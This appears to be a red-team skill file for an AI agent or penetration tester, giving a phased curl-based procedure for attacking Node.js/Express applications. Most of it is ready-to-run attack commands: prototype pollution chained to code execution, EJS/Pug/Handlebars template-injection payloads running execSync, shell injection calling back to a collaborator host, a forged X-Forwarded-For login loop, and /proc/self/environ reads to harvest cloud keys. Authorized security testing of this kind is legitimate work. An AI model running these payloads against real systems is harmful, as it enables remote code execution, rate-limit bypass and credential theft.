---
name: hunt-nodejs
description: Hunt Node.js specific vulnerabilities — Prototype Pollution → RCE chains (lodash/merge/assign), Express trust proxy misconfiguration, child_process/eval injection, template engine SSTI (EJS/Pug/Handlebars), path traversal in file servers, require() injection, environment variable exfil via /proc/self/environ. Use when target runs Node.js/Express/Fastify/NestJS/Koa.
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [nodejs, hunt, redteam, javascript]
  category: redteam
---

# HUNT-NODEJS — Node.js Specific Vulnerabilities

## When to Use

- Target runs Node.js/Express/Fastify/NestJS/Koa.

## Prerequisites

- Explicit authorization, target boundaries, and rate limits for the target.
- Tooling: `curl`.
- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.

## How to Run

```bash
# Confirm Node.js/Express
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"

# Check for package.json / node_modules exposure
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/package.json"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/package-lock.json"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/node_modules/.package-lock.json"

# Error-based version detection
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot GET"
```

## Procedure

The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.

## Crown Jewel Targets

Prototype Pollution reaching a sink in Node.js backend = Critical RCE.

**Highest-value chains:**
- **Prototype Pollution → RCE** — `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink
- **Express trust proxy** — `app.set('trust proxy', true)` without validation → attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits
- **EJS/Pug SSTI** — template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`
- **`child_process` injection** — user input interpolated into shell command string → OS command injection
- **`require()` path traversal** — attacker-controlled module path → load arbitrary file as JS

---

## Attack Surface Signals

```
X-Powered-By: Express           Confirms Express.js
Node.js in error messages        Runtime detected
package.json exposed             Dependency list + versions
/proc/self/environ accessible    Environment variable exfil
Error stack traces with .js paths  Node.js confirmed
__proto__ in JSON accepted        Prototype pollution candidate
```

---

## Phase 1 — Fingerprint

```bash
# Confirm Node.js/Express
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"

# Check for package.json / node_modules exposure
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/package.json"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/package-lock.json"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/node_modules/.package-lock.json"

# Error-based version detection
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot GET"
```

---

## Phase 2 — Prototype Pollution Detection

```bash
# JSON body injection — test if __proto__ is accepted
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'

# Constructor prototype
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/settings \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

# URL query param injection (qs library)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/search?__proto__[polluted]=yes&query=test"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/data?constructor[prototype][admin]=1"

# Confirm pollution: does a subsequent request reflect the polluted key?
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
```

---

## Phase 3 — Prototype Pollution → RCE Chain

```bash
# If pollution is confirmed, attempt to reach dangerous sinks

# Sink 1: child_process via options.shell pollution
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "node",
      "NODE_OPTIONS": "--require /proc/self/fd/0",
      "env": {"NODE_OPTIONS": "--inspect=COLLAB_HOST"}
    }
  }'

# Sink 2: lodash template pollution (CVE-2021-23337)
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}'

# Sink 3: ejs template options pollution
# If EJS is used for rendering, pollute the `opts.escapeXML` or `opts.outputFunctionName`
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/template \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"}}'

# OOB confirmation — check Interactsh for callback
```

---

## Phase 4 — Express Trust Proxy Abuse

```bash
# If Express has trust proxy enabled, X-Forwarded-For is trusted
# Test: does spoofed IP bypass IP-based rate limiting or allowlist?

# Spoof IP to 127.0.0.1 (localhost bypass)
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/admin/action \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"action": "test"}'

# Spoof to internal IP range
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/internal \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Real-IP: 10.0.0.1"

# Rate limit bypass via rotating fake IPs
for i in $(seq 1 50); do
  curl --max-time 30 --connect-timeout 10 -s https://$TARGET/api/login \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d '{"email":"admin@test.com","password":"wrong"}' \
    -o /dev/null -w "$i: %{http_code}\n"
done
```

---

## Phase 5 — Template Engine SSTI (EJS / Pug / Handlebars)

```bash
# EJS SSTI — if user input reaches EJS template context
# Test basic: <%= 7*7 %> should return 49
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= 7*7 %>"}'

# EJS RCE payload
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'

# Pug SSTI
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'

# Handlebars — prototype pollution via template
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
```

---

## Phase 6 — child_process Command Injection

```bash
# Look for endpoints that run shell commands with user input
# Signals: /api/convert, /api/exec, /api/ping, /api/scan

# Basic injection test
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/ping?host=127.0.0.1;id"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci"
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/exec \
  -H "Content-Type: application/json" \
  -d '{"command": "ls", "args": ["&&", "curl", "COLLAB_HOST/ci"]}'

# OOB via DNS
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
```

---

## Phase 7 — /proc/self/environ Exfil

```bash
# If LFI exists on Node.js app, /proc/self/environ leaks env vars
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/environ"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/read?file=../../../../proc/self/environ"

# Also check:
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command-line
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
```

---

## Chain Table

| Node.js finding | Chain to | Impact |
|----------------|----------|--------|
| Prototype pollution confirmed | Find RCE sink (child_process, eval) | Critical RCE |
| Express trust proxy | Bypass IP allowlist / rate limit | Auth bypass / DoS bypass |
| SSTI in template engine | OS command execution | Critical RCE |
| child_process injection | `id && curl COLLAB_HOST` | Critical RCE |
| /proc/self/environ via LFI | AWS_ACCESS_KEY_ID leaked | Cloud compromise |

---

## Validation

✅ Prototype pollution: key appears in subsequent API responses without being sent
✅ RCE chain: OOB callback received OR `id` output in response
✅ Trust proxy: spoofed IP accepted, bypasses rate limit or allowlist

**Severity:**
- Prototype pollution → RCE: Critical
- SSTI → RCE: Critical
- child_process injection: Critical
- Trust proxy → rate limit bypass: Medium
- /proc/self/environ exfil: High (if cloud keys present)

## Verification

Run this self-test to confirm nodejs hunting readiness:

1. **Skill integrity** — confirm the skill file is readable and well-formed:
   ```bash
   grep -q "name: hunt-nodejs" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
   ```

2. **Category check** — confirm the skill has a category:
   ```bash
   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
   ```

3. **Pitfalls section** — confirm pitfalls are documented:
   ```bash
   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
   ```

All 3 tests verify the skill is properly structured and ready for use.

---

## Pitfalls
- **Prototype pollution without gadget** — `__proto__` injection is a primitive. Need a gadget chain to RCE, auth bypass, or XSS.
- **eval with static input** — `eval("'use strict'; ...")` is not exploitable. Need dynamic, user-controllable input.
- **child_process without user input** — `exec("ls -la")` is not exploitable unless the command includes user input.
- **Server-Side JavaScript Injection (SSJI)** — different from prototype pollution. Distinguish the two attack classes.

---

## Related Skills

- **`hunt-api-misconfig`** — Prototype pollution is a root cause category shared between API misconfig and Node.js-specific sinks. Chain primitive: JSON merge accepting `__proto__` → `hunt-api-misconfig` mass-assignment pattern (extra controller parameters) → admin field pollutes user object.
- **`hunt-rce`** — Prototype pollution that reaches `child_process` or `vm.runInThisContext` = RCE. Chain primitive: `__proto__` polluted with `shell:true` or `NODE_OPTIONS: "--require /proc/self/fd/0"` → `child_process.spawn` uses attacker-controlled env → arbitrary command execution.
- **`hunt-ssti`** — EJS, Pug, and Handlebars SSTI are Node.js-specific RCE vectors. Chain primitive: template engine receives user input via `render()` with unsanitized options → `outputFunctionName` pollution (EJS CVE-2022-29078) → `process.mainModule.require('child_process').execSync('id')`.
- **`hunt-lfi`** — Node.js LFI often reaches `require()` path traversal or `res.sendFile()` sinks. Chain primitive: `?file=../../../etc/passwd` on Express static file server → read configs; `require(userPath)` → load attacker-controlled JS file as module → RCE.
- **`hunt-ssrf`** — Express `http-proxy-middleware` with wildcard target config is a Node.js SSRF vector. Chain primitive: proxy target set to user input → request forwarded to internal service → read cloud metadata or internal admin panel.
- **`hunt-brute-force`** — Express `trust proxy` misconfiguration defeats IP-based rate limiting. Chain primitive: `app.set('trust proxy', true)` + `X-Forwarded-For: 127.0.0.1` → attacker bypasses login rate limit by rotating spoofed IPs.
- **`security-arsenal`** — Reach for the Node.js prototype pollution gadget tree (`lodash.merge`, `Object.assign`, `qs.parse`, `express-formidable`, `cookie-parser` merge modes) and EJS/Pug/Handlebars SSTI payload packs.
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE from prototype pollution. Pollution of `__proto__` is a primitive — only Critical when it reaches a sink that interprets the polluted property as a command/env/option. Prove the sink is reachable with an OOB callback before writing the report.
